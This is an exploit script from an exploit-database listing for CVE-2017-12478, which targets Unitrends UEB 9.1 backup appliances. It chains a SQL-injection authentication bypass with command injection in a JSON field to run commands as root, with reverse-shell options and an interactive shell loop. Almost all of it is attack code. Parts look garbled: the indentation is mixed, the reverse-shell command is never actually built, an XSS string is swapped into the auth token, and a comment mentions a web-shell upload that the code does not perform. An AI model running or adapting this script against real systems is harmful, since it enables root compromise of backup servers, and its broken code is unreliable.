# Exploit Title: Unauthenticated root RCE for Unitrends UEB 9.1
# Date: 08/08/2017
# Exploit Authors: Cale Smith, Benny Husted, Jared Arave
# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
# Vendor Homepage: https://www.unitrends.com/
# Software Link: https://www.unitrends.com/download/enterprise-backup-software
# Version: 9.1
# Tested on: CentOS6
# CVE: CVE-2017-12478
import json
import requests
from urllib import quote
from base64 import b64encode
import httplib
import urllib
import ssl
import random
import sys
import base64
import string
from optparse import OptionParser
import socket


# Disable SSL Cert validation
if hasattr(ssl, '_create_unverified_context'):
            ssl._create_default_https_context = ssl._create_unverified_context

# Parse command line args:
usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n"\
	    "       %prog -c 'touch /tmp/foooooooooooo'"

parser = OptionParser(usage=usage)
parser.add_option("-r", '--RHOST', dest='rhost', action="store",
				  help="Target host w/ UNITRENDS UEB installation")
parser.add_option("-l", '--LHOST', dest='lhost', action="store",
				  help="Host listening for reverse shell connection")
parser.add_option("-p", '--LPORT', dest='lport', action="store",
				  help="Port on which nc is listening")
parser.add_option("-c", '--cmd', dest='cmd', action="store",
				  help="Run a custom command, no reverse shell for you.")
parser.add_option("-P", '--Path', dest='path', action="store",
				  help="Run a path, ")
(options, args) = parser.parse_args()

if options.cmd:
	if (options.lhost or options.lport):
		parser.error("[!] Options --cmd and [--LHOST||--LPORT] are mututally exclusive.\n")

	elif not options.rhost:
		parser.error("[!] No remote host specified.\n")

elif options.rhost is None or options.lhost is None or options.lport is None:
	parser.print_help()
	sys.exit(1)

RHOST = options.rhost
LHOST = options.lhost
LPORT = options.lport
if options.cmd:
	cmd = options.cmd
else:
	cmd = 'id'.format(LHOST, LPORT)


url = options.path

# Here, a SQLi string overrides the uuid, providing auth bypass.
# We'll need to base64 encode before sending...
auth = base64.b64encode("v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0")

params = urllib.urlencode({'auth' : auth})

params = """{{"type":4,"name":"aaaaaaaa","usage":"archive","properties":{{"username":"km@gmail.com","password":"km","port":"443","hostname":"coinbase.com","protocol":"cifs","share_name":"`{0}`"}}}}""".format(cmd)
headers = {'Host' : RHOST,
		   'Content-Type' : 'application/json',
		   'X-Requested-With' : 'XMLHttpRequest',
		   'AuthToken' : auth }

# Establish an HTTPS connection and send the payload.
conn = httplib.HTTPSConnection(RHOST, 443)
conn.set_debuglevel(1)

print """
[+] Sending payload to remote host [https://{0}]
[+] Here's some debug info:
""".format(RHOST)

conn.request("POST", url, params, headers=headers)
r1 = conn.getresponse()

print ""
print "[+] Request sent. Maybe your command was executed?"
print ""


 # Try to upload the PHP web shell to the server
if r1.status == 200:
    print("EXPLOIT: Connected to website! Status Code: {}").format(r1.status)
else:
    print("ERRORED: Could not connect to website! Status Code: {}").format(r1.status)
    exit()
# Print response, for debug purposes.
print r1.status, r1.reason
print r1.read()

while True:
    try:
        if options.cmd:
	    cmd = options.cmd
            cmd = raw_input('[She3LL]:~# ')
            
            auth = base64.b64encode("v0:b' <script>var pos=document.URL.indexOf('context=')+8;document.write(decodeURIComponent(document.URL.substring(pos)));</script> :1:/usr/bp/logs.dir/gui_root.log:0")

            params = urllib.urlencode({'auth' : auth})

            params = """{{"type":4,"name":"aaaaaaaa","usage":"archive","properties":            {{"username":"km@gmail.com","password":"km","port":"443","hostname":"coinbase.com","protocol":"cifs","share_name":"{0}"}}}}""".format(cmd)
            headers = {'Host' : RHOST,
		   'Content-Type' : 'application/json',
		   'X-Requested-With' : 'XMLHttpRequest',
		   'AuthToken' : auth }

            conn = httplib.HTTPSConnection(RHOST, 443)
            conn.set_debuglevel(1)
            conn.request("GET", url, params, headers=headers)
            r1 = conn.getresponse()

            print r1.status, r1.reason
            print r1.read()

            if cmd.strip() == 'exit':
                break
            

    except Exception:
        break



# 3. Solution:
# Update to Unitrends UEB 10
